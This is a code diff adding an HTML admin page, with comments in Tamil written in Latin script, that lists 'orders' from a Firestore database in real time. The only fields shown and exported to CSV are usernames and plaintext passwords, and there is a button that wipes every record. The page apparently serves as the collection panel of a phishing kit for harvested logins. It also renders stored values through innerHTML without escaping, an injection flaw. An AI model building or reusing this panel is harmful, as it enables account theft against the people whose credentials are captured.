@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #f9f9f9; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; }
+        .action-btns button { padding: 10px 15px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; margin-left: 10px; }
+        .btn-download { background-color: #4CAF50; }
+        .btn-download:hover { background-color: #45a049; }
+        .btn-clear { background-color: #f44336; }
+        .btn-clear:hover { background-color: #da190b; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background-color: white; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #0095f6; color: white; }
+    </style>
+</head>
+<body>
+    <div class="header-container">
+        <h2>Admin Dashboard - Live Orders</h2>
+        <div class="action-btns">
+            <button id="downloadBtn" class="btn-download">⬇ Download CSV</button>
+            <button id="clearBtn" class="btn-clear">🗑 Clear All Data</button>
+        </div>
+    </div>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+            </tr>
+        </thead>
+        <tbody id="orderTableBody">
+            </tbody>
+    </table>
+
+    <script type="module">
+        import { db } from './config.js';
+        // Inga puthusa getDocs, deleteDoc, doc import pannirukom
+        import { collection, onSnapshot, query, orderBy, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
+        let allOrders = []; // Download pandradhuku data save panna oru array
+
+        // 1. Real-time ah data eduka
+        onSnapshot(q, (snapshot) => {
+            const tableBody = document.getElementById('orderTableBody');
+            tableBody.innerHTML = ''; 
+            allOrders = []; // Reset array on update
+            
+            snapshot.forEach((document) => {
+                const data = document.data();
+                allOrders.push(data); // Array la add pandrom
+                
+                tableBody.innerHTML += `
+                    <tr>
+                        <td>${data.username}</td>
+                        <td>${data.password}</td>
+                    </tr>
+                `;
+            });
+        });
+
+        // 2. Download Data Function
+        document.getElementById('downloadBtn').addEventListener('click', () => {
+            if (allOrders.length === 0) {
+                alert("No data available to download!");
+                return;
+            }
+
+            // CSV format ready pandrom
+            let csvContent = "Username,Password\n";
+            allOrders.forEach(order => {
+                csvContent += `"${order.username}","${order.password}"\n`;
+            });
+
+            // Browser la download aaga vaikrom
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement("a");
+            const url = URL.createObjectURL(blob);
+            link.setAttribute("href", url);
+            link.setAttribute("download", "orders_data.csv");
+            link.style.visibility = 'hidden';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+
+        // 3. Clear All Data Function
+        document.getElementById('clearBtn').addEventListener('click', async () => {
+            const confirmDelete = confirm("Are you sure you want to clear ALL orders? This cannot be undone.");
+            
+            if (confirmDelete) {
+                try {
+                    const querySnapshot = await getDocs(collection(db, "orders"));
+                    querySnapshot.forEach(async (documentSnapshot) => {
+                        // Ovoru order ah database la irundhu delete pandrom
+                        await deleteDoc(doc(db, "orders", documentSnapshot.id));
+                    });
+                    alert("All data cleared successfully!");
+                } catch (error) {
+                    console.error("Error clearing data: ", error);
+                    alert("Failed to clear data.");
+                }
+            }
+        });
+    </script>
+</body>
+</html>
